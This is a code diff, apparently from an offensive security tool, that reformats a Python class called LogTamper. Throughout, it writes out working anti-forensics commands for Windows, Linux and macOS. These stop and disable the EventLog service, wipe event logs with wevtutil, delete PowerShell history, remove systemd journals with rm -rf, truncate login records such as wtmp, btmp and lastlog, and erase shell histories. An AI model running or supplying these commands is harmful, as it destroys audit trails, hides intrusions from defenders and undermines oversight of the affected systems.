@@ -118,34 +118,44 @@ class LogTamper:
 
         ps_commands = []
         if self.config.suspend_windows_eventlog:
-            ps_commands.extend([
-                "# Suspend EventLog service threads",
-                "Stop-Service -Name EventLog -Force",
-                "Set-Service -Name EventLog -StartupType Disabled",
-            ])
+            ps_commands.extend(
+                [
+                    "# Suspend EventLog service threads",
+                    "Stop-Service -Name EventLog -Force",
+                    "Set-Service -Name EventLog -StartupType Disabled",
+                ]
+            )
 
         ps_commands.append("# Clear individual event logs")
         for log in event_logs:
-            ps_commands.append(f"wevtutil cl \"{log}\"")
+            ps_commands.append(f'wevtutil cl "{log}"')
 
-        ps_commands.extend([
-            "# Clear PowerShell operational log",
-            'wevtutil cl "Microsoft-Windows-PowerShell/Operational"',
-            "# Clear PSReadline history",
-            "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue",
-        ])
+        ps_commands.extend(
+            [
+                "# Clear PowerShell operational log",
+                'wevtutil cl "Microsoft-Windows-PowerShell/Operational"',
+                "# Clear PSReadline history",
+                "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue",
+            ]
+        )
 
         if self.config.restore_eventlog_service:
-            ps_commands.extend([
-                "# Restore EventLog service after clearing",
-                "Set-Service -Name EventLog -StartupType Automatic",
-                "Start-Service -Name EventLog",
-            ])
+            ps_commands.extend(
+                [
+                    "# Restore EventLog service after clearing",
+                    "Set-Service -Name EventLog -StartupType Automatic",
+                    "Start-Service -Name EventLog",
+                ]
+            )
 
-        verification = [
-            "# Verify logs are cleared",
-            'Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object LogName, RecordCount',
-        ] if self.config.verification else []
+        verification = (
+            [
+                "# Verify logs are cleared",
+                "Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object LogName, RecordCount",
+            ]
+            if self.config.verification
+            else []
+        )
 
         return {
             "platform": "windows",
@@ -155,7 +165,9 @@ class LogTamper:
             "batch_commands": [
                 "sc stop EventLog",
                 "sc config EventLog start= disabled",
-            ] + [f'wevtutil cl "{log}"' for log in event_logs] + [
+            ]
+            + [f'wevtutil cl "{log}"' for log in event_logs]
+            + [
                 "sc config EventLog start= auto",
                 "sc start EventLog",
             ],
@@ -174,42 +186,52 @@ class LogTamper:
 
         commands = []
 
-        commands.extend([
-            "# Clear systemd journal",
-            "journalctl --rotate",
-            "journalctl --vacuum-time=1s",
-            "journalctl --vacuum-size=1M",
-            "rm -rf /var/log/journal/* /run/log/journal/*",
-        ])
+        commands.extend(
+            [
+                "# Clear systemd journal",
+                "journalctl --rotate",
+                "journalctl --vacuum-time=1s",
+                "journalctl --vacuum-size=1M",
+                "rm -rf /var/log/journal/* /run/log/journal/*",
+            ]
+        )
 
         commands.append("# Clear traditional log files")
         for log_path in log_paths:
             expanded = log_path.replace("~", "$HOME")
-            commands.append(f"> \"{expanded}\" 2>/dev/null || truncate -s 0 \"{expanded}\" 2>/dev/null")
+            commands.append(f'> "{expanded}" 2>/dev/null || truncate -s 0 "{expanded}" 2>/dev/null')
 
         if self.config.clear_shell_history:
-            commands.extend([
-                "# Clear shell history",
-                "unset HISTFILE",
-                "history -c 2>/dev/null",
-                "rm -f ~/.bash_history ~/.zsh_history ~/.zhistory ~/.fish_history ~/.ksh_history",
-                "> ~/.bash_history 2>/dev/null",
-                "kill -9 $$",
-            ])
+            commands.extend(
+                [
+                    "# Clear shell history",
+                    "unset HISTFILE",
+                    "history -c 2>/dev/null",
+                    "rm -f ~/.bash_history ~/.zsh_history ~/.zhistory ~/.fish_history ~/.ksh_history",
+                    "> ~/.bash_history 2>/dev/null",
+                    "kill -9 $$",
+                ]
+            )
 
-        commands.extend([
-            "# Clear wtmp/btmp/lastlog (login records)",
-            "> /var/log/wtmp 2>/dev/null",
-            "> /var/log/btmp 2>/dev/null",
-            "> /var/log/lastlog 2>/dev/null",
-            "> /var/run/utmp 2>/dev/null",
-        ])
+        commands.extend(
+            [
+                "# Clear wtmp/btmp/lastlog (login records)",
+                "> /var/log/wtmp 2>/dev/null",
+                "> /var/log/btmp 2>/dev/null",
+                "> /var/log/lastlog 2>/dev/null",
+                "> /var/run/utmp 2>/dev/null",
+            ]
+        )
 
-        verification = [
-            "# Verify logs cleared",
-            "journalctl --list-boots",
-            "ls -la /var/log/auth.log /var/log/syslog /var/log/btmp /var/log/wtmp 2>/dev/null",
-        ] if self.config.verification else []
+        verification = (
+            [
+                "# Verify logs cleared",
+                "journalctl --list-boots",
+                "ls -la /var/log/auth.log /var/log/syslog /var/log/btmp /var/log/wtmp 2>/dev/null",
+            ]
+            if self.config.verification
+            else []
+        )
 
         return {
             "platform": "linux",
@@ -245,17 +267,23 @@ class LogTamper:
         ]
 
         if self.config.clear_shell_history:
-            commands.extend([
-                "# Clear shell history",
-                "> ~/.zsh_history 2>/dev/null",
-                "> ~/.bash_history 2>/dev/null",
-                "rm -f ~/.zsh_sessions/* 2>/dev/null",
-            ])
+            commands.extend(
+                [
+                    "# Clear shell history",
+                    "> ~/.zsh_history 2>/dev/null",
+                    "> ~/.bash_history 2>/dev/null",
+                    "rm -f ~/.zsh_sessions/* 2>/dev/null",
+                ]
+            )
 
-        verification = [
-            "log show --last 5m",
-            "ls -la /var/log/system.log ~/Library/Logs/ 2>/dev/null",
-        ] if self.config.verification else []
+        verification = (
+            [
+                "log show --last 5m",
+                "ls -la /var/log/system.log ~/Library/Logs/ 2>/dev/null",
+            ]
+            if self.config.verification
+            else []
+        )
 
         return {
             "platform": "macos",
